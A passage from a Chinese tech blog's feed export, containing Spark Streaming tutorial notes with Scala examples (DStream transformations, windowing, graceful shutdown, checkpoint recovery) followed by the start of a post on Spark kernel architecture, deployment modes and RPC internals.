DStream</td></tr><tr><td>reduceByKey(func, [numTasks])</td><td>利用 func 函数对源 DStream 中的 key 进行聚合操作，然后返回新的(K，V)对构成的 DStream</td></tr><tr><td>join(otherStream, [numTasks])</td><td>输入为(K,V)、(K,W)类型的 DStream，返回一个新的(K，(V，W)类型的 DStream</td></tr><tr><td><strong>transform(func)</strong></td><td>通过 RDD-to-RDD 函数作用于 DStream 中的各个 RDD，可以是任意的 RDD 操作，从而返回一个新的 RDD</td></tr></tbody></table><p>Transform示例</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming06_State_Transform</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transform方法可以将底层RDD获取到后进行操作</span></span><br><span class="line">        <span class="comment">// 1. DStream功能不完善</span></span><br><span class="line">        <span class="comment">// 2. 需要代码周期性的执行</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Code : Driver端</span></span><br><span class="line">        <span class="keyword">val</span> newDS: <span class="type">DStream</span>[<span class="type">String</span>] = lines.transform(</span><br><span class="line">            rdd =&gt; &#123;</span><br><span class="line">                <span class="comment">// Code : Driver端，（周期性执行）</span></span><br><span class="line">                rdd.map(</span><br><span class="line">                    str =&gt; &#123;</span><br><span class="line">                        <span class="comment">// Code : Executor端</span></span><br><span class="line">                        str</span><br><span class="line">                    &#125;</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// Code : Driver端</span></span><br><span class="line">        <span class="keyword">val</span> newDS1: <span class="type">DStream</span>[<span class="type">String</span>] = lines.map(</span><br><span class="line">            data =&gt; &#123;</span><br><span class="line">                <span class="comment">// Code : Executor端</span></span><br><span class="line">                data</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>有状态转化操作</strong></p><p>有状态转换包括基于追踪状态变化的转换(updateStateByKey)和滑动窗口的转换</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming05_State</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line">        ssc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 无状态数据操作，只对当前的采集周期内的数据进行处理</span></span><br><span class="line">        <span class="comment">// 在某些场合下，需要保留数据统计结果（状态），实现数据的汇总</span></span><br><span class="line">        <span class="comment">// 使用有状态操作时，需要设定检查点路径</span></span><br><span class="line">        <span class="keyword">val</span> datas = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToOne = datas.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">//val wordToCount = wordToOne.reduceByKey(_+_)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// updateStateByKey：根据key对数据的状态进行更新</span></span><br><span class="line">        <span class="comment">// 传递的参数中含有两个值</span></span><br><span class="line">        <span class="comment">// 第一个值表示相同的key的value数据</span></span><br><span class="line">        <span class="comment">// 第二个值表示缓存区相同key的value数据</span></span><br><span class="line">        <span class="keyword">val</span> state = wordToOne.updateStateByKey(</span><br><span class="line">            ( seq:<span class="type">Seq</span>[<span class="type">Int</span>], buff:<span class="type">Option</span>[<span class="type">Int</span>] ) =&gt; &#123;</span><br><span class="line">                <span class="keyword">val</span> newCount = buff.getOrElse(<span class="number">0</span>) + seq.sum</span><br><span class="line">                <span class="type">Option</span>(newCount)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        state.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Window Operations 可以设置窗口的大小和滑动窗口的间隔来动态的获取当前Steaming 的允许状态。所有基于窗口的操作都需要两个参数，分别为窗口时长以及滑动步长。注意：这两者都必须为采集周期大小的整数倍</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming06_State_Window</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 窗口的范围应该是采集周期的整数倍</span></span><br><span class="line">        <span class="comment">// 窗口可以滑动的，但是默认情况下，一个采集周期进行滑动</span></span><br><span class="line">        <span class="comment">// 这样的话，可能会出现重复数据的计算，为了避免这种情况，可以改变滑动的滑动（步长）</span></span><br><span class="line">        <span class="keyword">val</span> windowDS: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordToOne.window(<span class="type">Seconds</span>(<span class="number">6</span>), <span class="type">Seconds</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToCount = windowDS.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">        wordToCount.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于Window 的操作还有如下方法：</p><ul><li>window(windowLength, slideInterval): 基于对源DStream 窗化的批次进行计算返回一个新的Dstream；</li><li>countByWindow(windowLength, slideInterval): 返回一个滑动窗口计数流中的元素个数；</li><li>reduceByWindow(func, windowLength, slideInterval): 通过使用自定义函数整合滑动区间流元素来创建一个新的单元素流；</li><li>reduceByKeyAndWindow(func, windowLength, slideInterval, [numTasks]): 当在一个(K,V) 对的DStream 上调用此函数，会返回一个新(K,V)对的 DStream，此处通过对滑动窗口中批次数据使用 reduce 函数来整合每个 key 的 value 值。</li><li>reduceByKeyAndWindow(func, invFunc, windowLength, slideInterval, [numTasks]): 这个函数是上述函数的变化版本，每个窗口的 reduce 值都是通过用前一个窗的 reduce 值来递增计算。通过 reduce 进入到滑动窗口数据并&quot;反向 reduce&quot;离开窗口的旧数据来实现这个操作。一个例子是随着窗口滑动对keys 的&quot;加&quot;“减&quot;计数。通过前边介绍可以想到，这个函数只适用于&quot;可逆的 reduce 函数”，也就是这些 reduce 函数有相应的&quot;反 reduce&quot;函数(以参数 invFunc 形式传入)。如前述函数，reduce 任务的数量通过可选参数来配置</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// reduceByKeyAndWindow : 当窗口范围比较大，但是滑动幅度比较小，那么可以采用增加数据和删除数据的方式</span></span><br><span class="line"><span class="comment">// 无需重复计算，提升性能。</span></span><br><span class="line"><span class="keyword">val</span> windowDS: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] =</span><br><span class="line">    wordToOne.reduceByKeyAndWindow(</span><br><span class="line">        (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; &#123; x + y&#125;,</span><br><span class="line">        (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; &#123;x - y&#125;,</span><br><span class="line">        <span class="type">Seconds</span>(<span class="number">9</span>), <span class="type">Seconds</span>(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="2-3-DStream-输出">2.3 DStream 输出</h3><p>Output Operations 可以将 DStream 的数据输出到外部的数据库或文件系统。当某个 Output Operations 被调用时，spark streaming 程序才会开始真正的计算过程(与 RDD 的 Action 类似)</p><table><thead><tr><th><strong>Output Operation</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>print()</td><td>打印到控制台</td></tr><tr><td>saveAsTextFiles(prefix, [suffix])</td><td>保存流的内容为文本文件，文件名为&quot;prefix-TIME_IN_MS[.suffix]&quot;</td></tr><tr><td>saveAsObjectFiles(prefix,[suffix])</td><td>保存流的内容为 SequenceFile，文件名为 “prefix-TIME_IN_MS[.suffix]”</td></tr><tr><td>saveAsHadoopFiles(prefix,[suffix])</td><td>保存流的内容为 hadoop 文件，文件名为&quot;prefix-TIME_IN_MS[.suffix]&quot;</td></tr><tr><td>foreachRDD(func)</td><td>对 Dstream 里面的每个 RDD 执行 func；注意连接不能写在 driver 层面（序列化）； 如果写在 foreach 则每个 RDD 中的每一条数据都创建，得不偿失；增加 foreachPartition，在分区创建（获取）</td></tr></tbody></table><h3 id="2-4-优雅关闭">2.4 优雅关闭</h3><p>流式任务需要 7*24 小时执行，但是有时涉及到升级代码需要主动停止程序，但是分布式程序，没办法做到一个个进程去杀死，所有配置优雅的关闭就显得至关重要了。使用外部文件系统来控制内部程序关闭</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming08_Close</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           线程的关闭：</span></span><br><span class="line"><span class="comment">           val thread = new Thread()</span></span><br><span class="line"><span class="comment">           thread.start()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           thread.stop(); // 强制关闭</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        wordToOne.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果想要关闭采集器，那么需要创建新的线程</span></span><br><span class="line">        <span class="comment">// 而且需要在第三方程序中增加关闭状态</span></span><br><span class="line">        <span class="keyword">new</span> <span class="type">Thread</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="type">Runnable</span> &#123;</span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">                    <span class="comment">// 优雅地关闭</span></span><br><span class="line">                    <span class="comment">// 计算节点不在接收新的数据，而是将现有的数据处理完毕，然后关闭</span></span><br><span class="line">                    <span class="comment">// Mysql : Table(stopSpark) =&gt; Row =&gt; data</span></span><br><span class="line">                    <span class="comment">// Redis : Data（K-V）</span></span><br><span class="line">                    <span class="comment">// ZK    : /stopSpark</span></span><br><span class="line">                    <span class="comment">// HDFS  : /stopSpark</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    while ( true ) &#123;</span></span><br><span class="line"><span class="comment">                        if (true) &#123;</span></span><br><span class="line"><span class="comment">                            // 获取SparkStreaming状态</span></span><br><span class="line"><span class="comment">                            val state: StreamingContextState = ssc.getState()</span></span><br><span class="line"><span class="comment">                            if ( state == StreamingContextState.ACTIVE ) &#123;</span></span><br><span class="line"><span class="comment">                                ssc.stop(true, true)</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        Thread.sleep(5000)</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line"></span><br><span class="line">                    <span class="type">Thread</span>.sleep(<span class="number">5000</span>)</span><br><span class="line">                    <span class="keyword">val</span> state: <span class="type">StreamingContextState</span> = ssc.getState()</span><br><span class="line">                    <span class="keyword">if</span> ( state == <span class="type">StreamingContextState</span>.<span class="type">ACTIVE</span> ) &#123;</span><br><span class="line">                        ssc.stop(<span class="literal">true</span>, <span class="literal">true</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">System</span>.exit(<span class="number">0</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ).start()</span><br><span class="line"></span><br><span class="line">        ssc.awaitTermination() <span class="comment">// block 阻塞main线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于优雅恢复，停止前可以保存检查点</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming09_Resume</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="type">StreamingContext</span>.getActiveOrCreate(<span class="string">"cp"</span>, ()=&gt;&#123;</span><br><span class="line">            <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">            <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line">            wordToOne.print()</span><br><span class="line">            ssc</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        ssc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination() <span class="comment">// block 阻塞main线程</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Spark3学习笔记&lt;/h1&gt;
&lt;h1&gt;一、Spark 基础&lt;/h1&gt;
&lt;h2 id=&quot;1、Spark概述&quot;&gt;1、Spark概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-Spark简介&quot;&gt;1.1 Spark简介&lt;/h3&gt;
&lt;p&gt;Spark 是一种基于内存的快速、通用、可扩展的大数据分析计算引擎。在 FullStack 理想的指引下，&lt;strong&gt;Spark 中的 Spark SQL 、SparkStreaming 、MLLib 、GraphX 、R 五大子框架和库之间可以无缝地共享数据和操作&lt;/strong&gt;， 这不仅打造了 Spark 在当今大数据计算领域其他计算框架都无可匹敌的优势， 而且使得 Spark 正在加速成为大数据处理中心首选通用计算平台。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Spark3内核源码与优化</title>
    <link href="https://blog.shawncoding.top/posts/28ae1688.html"/>
    <id>https://blog.shawncoding.top/posts/28ae1688.html</id>
    <published>2024-02-06T07:04:27.000Z</published>
    <updated>2024-02-29T12:00:08.251Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Spark内核原理</h1><h2 id="1、Spark-内核概述">1、Spark 内核概述</h2><h3 id="1-1-简介">1.1 简介</h3><p>Spark 内核泛指 Spark 的核心运行机制，包括 Spark 核心组件的运行机制、Spark 任务调度机制、Spark 内存管理机制、Spark 核心功能的运行原理等，熟练掌握 Spark 内核原理，能够帮助我们更好地完成 Spark 代码设计，并能够帮助我们准确锁定项目运行过程中出现的问题的症结所在</p><a id="more"></a><h3 id="1-2-Spark-核心组件">1.2 Spark 核心组件</h3><p><strong>Driver</strong>是Spark 驱动器节点，用于执行 Spark 任务中的 main 方法，负责实际代码的执行工作。Driver 在 Spark 作业执行时主要负责：</p><ul><li>将用户程序转化为作业（Job）</li><li>在 Executor 之间调度任务（Task）</li><li>跟踪Executor 的执行情况</li><li>通过UI 展示查询运行情况</li></ul><p><strong>Executor</strong>是负责在 Spark 作业中运行具体任务，任务彼此之间相互独立。Spark 应用启动时，ExecutorBackend 节点被同时启动，并且始终伴随着整个 Spark 应用的生命周期而存在。如果有 ExecutorBackend 节点发生了故障或崩溃，Spark 应用也可以继续执行， 会将出错节点上的任务调度到其他Executor 节点上继续运行，Executor 有两个核心功能：</p><ul><li>负责运行组成 Spark 应用的任务，并将结果返回给驱动器（Driver）</li><li>它们通过自身的块管理器（Block Manager）为用户程序中要求缓存的 RDD 提供内存式存储。RDD 是直接缓存在 Executor 进程内的，因此任务可以在运行时充分利用缓存</li></ul><h3 id="1-3-Spark-通用运行流程概述">1.3 Spark 通用运行流程概述</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251337069.png" alt></p><ul><li>任务提交后，都会先启动 Driver 程序；</li><li>随后Driver 向集群管理器注册应用程序；</li><li>集群管理器根据此任务的配置文件分配Executor 并启动；</li><li>Driver 开始执行 main 函数，Spark 查询为懒执行，当执行到 Action 算子时开始反向推算，根据宽依赖进行 Stage 的划分，随后每一个 Stage 对应一个Taskset，Taskset 中有多个 Task，查找可用资源Executor 进行调度；</li><li>根据本地化原则，Task 会被分发到指定的 Executor 去执行，在任务执行的过程中，Executor 也会不断与Driver 进行通信，报告任务运行情况</li></ul><h2 id="2、Spark-部署模式">2、Spark 部署模式</h2><h3 id="2-1-YARN-Cluster-模式-重点">2.1 YARN Cluster 模式(重点)</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251337070.png" alt></p><ul><li>执行脚本提交任务，实际是启动一个 SparkSubmit 的 JVM 进程</li><li>SparkSubmit 类中的 main 方法反射调用 YarnClusterApplication 的 main 方法</li><li>YarnClusterApplication 创建 Yarn 客户端，然后向 Yarn 服务器发送执行指令：bin/java ApplicationMaster</li><li>Yarn 框架收到指令后会在指定的 NM 中启动ApplicationMaster</li><li>ApplicationMaster 启动 Driver 线程，执行用户的作业</li><li>AM 向 RM 注册，申请资源</li><li>获取资源后 AM 向NM 发送指令：bin/java YarnCoarseGrainedExecutorBackend</li><li>CoarseGrainedExecutorBackend 进程会接收消息，跟 Driver 通信，注册已经启动的Executor；然后启动计算对象 Executor 等待接收任务</li><li>Driver 线程继续执行完成作业的调度和任务的执行</li><li>Driver 分配任务并监控任务的执行</li></ul><p><strong>注意：SparkSubmit、ApplicationMaster 和CoarseGrainedExecutorBackend 是独立的进程；Driver是独立的线程；Executor 和 YarnClusterApplication 是对象</strong></p><h3 id="2-2-YARN-Client-模式">2.2 YARN Client 模式</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251337071.png" alt></p><ul><li>执行脚本提交任务，实际是启动一个 SparkSubmit 的 JVM 进程</li><li>SparkSubmit 类中的 main 方法反射调用用户代码的main 方法</li><li>启动Driver 线程，执行用户的作业，并创建 ScheduleBackend</li><li>YarnClientSchedulerBackend 向RM 发送指令：bin/java ExecutorLauncher</li><li>Yarn 框架收到指令后会在指定的 NM 中启动 ExecutorLauncher（实际上还是调用ApplicationMaster 的 main 方法）</li><li>AM 向 RM 注册，申请资源</li><li>获取资源后 AM 向NM 发送指令：bin/java CoarseGrainedExecutorBackend</li><li>CoarseGrainedExecutorBackend 进程会接收消息，跟 Driver 通信，注册已经启动的Executor；然后启动计算对象 Executor 等待接收任务</li><li>Driver 分配任务并监控任务的执行</li></ul><p><strong>注意：SparkSubmit、ApplicationMaster 和 YarnCoarseGrainedExecutorBackend 是独立的进程；Executor 和Driver 是对象</strong></p><h3 id="2-3-Standalone-Cluster-模式">2.3 Standalone Cluster 模式</h3><p><strong>在 Standalone Cluster 模式下，任务提交后，Master 会找到一个 Worker 启动 Driver</strong>。Driver 启动后向 Master 注册应用程序，Master 根据 submit 脚本的资源需求找到内部资源至少可以启动一个Executor 的所有 Worker，然后在这些 Worker 之间分配 Executor，Worker 上的 Executor 启动后会向Driver 反向注册，所有的 Executor 注册完成后，Driver 开始执行 main函数，之后执行到Action 算子时，开始划分Stage，每个 Stage 生成对应的 taskSet，之后将Task 分发到各个 Executor 上执行</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337072.png" alt></p><h3 id="2-4-Standalone-Client-模式">2.4 Standalone Client 模式</h3><p><strong>在 Standalone Client 模式下，Driver 在任务提交的本地机器上运行</strong>。Driver 启动后向Master 注册应用程序，Master 根据 submit 脚本的资源需求找到内部资源至少可以启动一个Executor 的所有 Worker，然后在这些 Worker 之间分配 Executor，Worker 上的 Executor 启动后会向 Driver 反向注册，所有的 Executor 注册完成后，Driver 开始执行 main 函数，之后执行到 Action 算子时，开始划分 Stage，每个 Stage 生成对应的 TaskSet，之后将 Task 分发到各个Executor 上执行</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337073.png" alt></p><h2 id="3、Spark-通讯架构">3、Spark 通讯架构</h2><h3 id="3-1-Spark-通信架构概述">3.1 Spark 通信架构概述</h3><ul><li>Spark 早期版本中采用 Akka 作为内部通信部件</li><li>Spark1.3 中引入Netty 通信框架，为了解决 Shuffle 的大数据传输问题使用</li><li>Spark1.6 中Akka 和Netty 可以配置使用。Netty 完全实现了 Akka 在 Spark 中的功能</li><li>Spark2 系列中，Spark 抛弃 Akka，使用 Netty。</li></ul><p>Spark2.x 版本使用 Netty 通讯框架作为内部通讯组件。Spark 基于 Netty 新的 RPC 框架借</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337074.png" alt></p><p>Endpoint（Client/Master/Worker）有 1 个 InBox 和N 个OutBox（N&gt;=1，N 取决于当前 Endpoint与多少其他的Endpoint 进行通信，一个与其通讯的其他Endpoint 对应一个OutBox），Endpoint接收到的消息被写入InBox，发送出去的消息写入 OutBox 并被发送到其他Endpoint 的InBox中</p><h3 id="3-2-Spark-通讯架构解析">3.2 Spark 通讯架构解析</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251337075.png" alt></p><ul><li>RpcEndpoint：RPC 通信终端。Spark 针对每个节点（Client/Master/Worker）都称之为一个 RPC 终端，且都实现 RpcEndpoint 接口，内部根据不同端点的需求，设计不同的消息和不同的业务处理，如果需要发送（询问）则调用Dispatcher。在 Spark 中，所有的终端都存在生命周期：Constructor/onStart/receive*/onStop</li><li>RpcEnv：RPC 上下文环境，每个 RPC 终端运行时依赖的上下文环境称为 RpcEnv；在把当前 Spark 版本中使用的 NettyRpcEnv</li><li>Dispatcher：消息调度（分发）器，针对于 RPC 终端需要发送远程消息或者从远程 RPC 接收到的消息，分发至对应的指令收件箱（发件箱）。如果指令接收方是自己则存入收件箱，如果指令接收方不是自己，则放入发件箱</li><li><strong>Inbox：指令消息收件箱</strong>。一个本地RpcEndpoint 对应一个收件箱，Dispatcher 